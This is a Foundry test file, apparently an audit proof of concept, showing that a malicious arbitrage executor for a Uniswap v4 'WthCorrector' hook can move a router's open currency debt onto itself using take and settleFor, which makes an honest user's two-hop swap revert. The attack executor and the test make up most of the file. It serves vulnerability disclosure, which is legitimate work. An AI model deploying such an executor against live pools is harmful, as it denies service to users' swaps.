// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";
import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {IUnlockCallback} from "@uniswap/v4-core/src/interfaces/callback/IUnlockCallback.sol";
import {TickMath} from "@uniswap/v4-core/src/libraries/TickMath.sol";
import {TransientStateLibrary} from "@uniswap/v4-core/src/libraries/TransientStateLibrary.sol";
import {BalanceDelta} from "@uniswap/v4-core/src/types/BalanceDelta.sol";
import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";
import {SwapParams} from "@uniswap/v4-core/src/types/PoolOperation.sol";

import {IWETH} from "frontier/interfaces/IWETH.sol";
import {IWthArbitrageExecutor} from "contracts/wth-corrector/IWthArbitrageExecutor.sol";
import {IWthCorrector} from "contracts/wth-corrector/IWthCorrector.sol";

import {WthCorrectorTest} from "../../wth-corrector/WthCorrector.t.sol";

/// Two-hop router, settlement deferred: sell coin on the plain pool, buy coin on the Frontier pool, then settle.
contract DeferredRouter is IUnlockCallback {
    IPoolManager public immutable pm;

    constructor(IPoolManager _pm) {
        pm = _pm;
    }

    receive() external payable {}

    function roundTrip(PoolKey memory plainKey, PoolKey memory frontierKey, uint256 coinIn) external {
        pm.unlock(abi.encode(plainKey, frontierKey, coinIn));
    }

    function unlockCallback(bytes calldata data) external returns (bytes memory) {
        (PoolKey memory plainKey, PoolKey memory frontierKey, uint256 coinIn) =
            abi.decode(data, (PoolKey, PoolKey, uint256));
        BalanceDelta hop1 = pm.swap(
            plainKey,
            SwapParams({zeroForOne: false, amountSpecified: -int256(coinIn), sqrtPriceLimitX96: TickMath.MAX_SQRT_PRICE - 1}),
            ""
        );
        uint256 ethGot = uint256(uint128(hop1.amount0()));
        BalanceDelta hop2 = pm.swap(
            frontierKey,
            SwapParams({zeroForOne: true, amountSpecified: -int256(ethGot), sqrtPriceLimitX96: TickMath.MIN_SQRT_PRICE + 1}),
            ""
        );
        pm.sync(plainKey.currency1);
        IERC20(Currency.unwrap(plainKey.currency1)).transfer(address(pm), coinIn);
        pm.settle();
        pm.take(frontierKey.currency1, address(this), uint256(uint128(hop2.amount1())));
        return "";
    }
}

/// Executor that moves the router's open coin debt onto itself: take + settleFor keeps the nonzero count.
contract DebtShiftExecutor is IWthArbitrageExecutor {
    using TransientStateLibrary for IPoolManager;

    IPoolManager public immutable pm;
    IWETH public immutable weth;
    address public immutable corrector;
    address public victim;

    constructor(IPoolManager _pm, IWETH _weth, address _corrector) {
        pm = _pm;
        weth = _weth;
        corrector = _corrector;
    }

    receive() external payable {}

    function setVictim(address v) external {
        victim = v;
    }

    function executeArbitrage(PoolKey calldata key, address, ProfitSplit calldata) external returns (uint256) {
        int256 debt = pm.currencyDelta(victim, key.currency1);
        if (debt < 0) {
            uint256 amount = uint256(-debt);
            pm.take(key.currency1, address(this), amount); // executor delta -amount, count +1
            pm.sync(key.currency1);
            IERC20(Currency.unwrap(key.currency1)).transfer(address(pm), amount);
            pm.settleFor(victim); // victim delta 0, count -1, synced currency reset to zero
        }
        uint256 pay = IWthCorrector(corrector).MIN_PAYMENT_WEI();
        weth.deposit{value: pay}();
        weth.transfer(corrector, pay);
        return 0;
    }
}

contract DebtShiftPoC is WthCorrectorTest {
    function test_debtShift_revertsTheUserSwap() public {
        uint256 coinIn = 1_000_000 ether;
        DeferredRouter router = new DeferredRouter(poolManager);
        vm.prank(users.buyerOne);
        wCoin.transfer(address(router), coinIn);

        // Control: an honest executor, the two-hop swap completes.
        uint256 snap = vm.snapshot();
        router.roundTrip(plainKey, key, coinIn);
        emit log_named_uint("control: router coin after round trip", wCoin.balanceOf(address(router)));
        vm.revertTo(snap);

        // Attack: the executor passes every corrector check, and the user's swap reverts.
        DebtShiftExecutor bad = new DebtShiftExecutor(poolManager, IWETH(address(weth)), address(corrector));
        vm.deal(address(bad), 1 ether);
        bad.setVictim(address(router));
        vm.prank(users.owner);
        corrector.setExecutor(address(bad));

        vm.expectRevert(IPoolManager.CurrencyNotSettled.selector);
        router.roundTrip(plainKey, key, coinIn);
    }
}
